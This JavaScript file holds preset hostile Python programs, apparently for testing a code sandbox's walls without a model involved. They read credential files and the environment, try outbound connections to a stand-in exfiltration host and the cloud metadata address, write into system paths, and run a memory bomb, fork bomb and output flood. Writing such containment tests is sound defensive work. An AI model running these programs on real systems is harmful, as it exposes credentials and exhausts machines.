// Hostile programs that go straight to the sandbox with no model involved, so the
// walls can be tested without relying on anything the model decides.
const DEFAULT_TARGETS = [['exfil.example.invalid', 80], ['1.1.1.1', 443], ['169.254.169.254', 80]];

const networkAttack = (targets = DEFAULT_TARGETS) => `import os, socket
print("environment visible to this process:", dict(os.environ), flush=True)
for path in ["/root/.aws/credentials", "/root/.ssh/id_rsa", "/etc/shadow", "/var/run/docker.sock", "/etc/padded-cell/env"]:
    try:
        print("READ", path, open(path, "rb").read(64), flush=True)
    except OSError as exc:
        print("blocked read", path, "->", exc.strerror, flush=True)
for host, port in [${targets.map(([host, port]) => `(${JSON.stringify(host)}, ${Number(port)})`).join(', ')}]:
    try:
        socket.create_connection((host, port), timeout=2).close()
        print("CONNECTED", host, port, flush=True)
    except OSError as exc:
        print("blocked connect", host, port, "->", exc, flush=True)
`;

export const ATTACK_NETWORK_SECRETS = networkAttack();

/** The presets as served. The network attack also aims at the canary listener when one is running. */
export function presetsFor(canaryTarget) {
  if (!canaryTarget) return PRESETS;
  // With no resolver a DNS lookup takes about 5 s here, and two would reach the 10 s wall clock. So one name at most.
  const isName = /[a-z]/i.test(canaryTarget.host) && !canaryTarget.host.includes(':');
  const others = isName ? DEFAULT_TARGETS.filter(([host]) => /^[\d.]+$/.test(host)) : DEFAULT_TARGETS;
  const code = networkAttack([[canaryTarget.host, canaryTarget.port], ...others]);
  return PRESETS.map((p) => (p.id === 'network_secrets' ? { ...p, code } : p));
}

export const PRESETS = [
  {
    id: 'network_secrets',
    title: 'Steal credentials and call out',
    description: 'Reads credential paths and the environment, then tries DNS, a public IP, the cloud metadata address and the canary listener.',
    code: ATTACK_NETWORK_SECRETS,
  },
  {
    id: 'write_root',
    title: 'Write to the root filesystem and the input',
    description: 'Tries to plant files in /, /etc, /usr/bin and the mounted input.',
    code: `for path in ["/planted", "/etc/planted", "/usr/bin/planted", "/input/data", "/code/main.py"]:
    try:
        open(path, "w").write("planted")
        print("WROTE", path)
    except OSError as exc:
        print("blocked write", path, "->", exc.strerror)
`,
  },
  {
    id: 'memory_bomb',
    title: 'Memory bomb',
    description: 'Allocates memory until something stops it.',
    code: `blocks = []
while True:
    blocks.append(bytearray(8 * 1024 * 1024))
    print("allocated MiB:", 8 * len(blocks), flush=True)
`,
  },
  {
    id: 'spin_forever',
    title: 'Infinite loop',
    description: 'Burns CPU until the wall clock kills the container.',
    code: `print("spinning", flush=True)
while True:
    pass
`,
  },
  {
    id: 'fork_bomb',
    title: 'Fork bomb',
    description: 'Forks children until the pids limit refuses more, then reports how many it got.',
    code: `import os, sys, time
count = 0
try:
    while True:
        if os.fork() == 0:
            time.sleep(60)
            os._exit(0)
        count += 1
except OSError as exc:
    print("fork refused after", count, "children:", exc.strerror, flush=True)
`,
  },
  {
    id: 'output_flood',
    title: 'Output flood',
    description: 'Writes to stdout without stopping, until the output cap kills it.',
    code: `while True:
    print("A" * 1024)
`,
  },
];
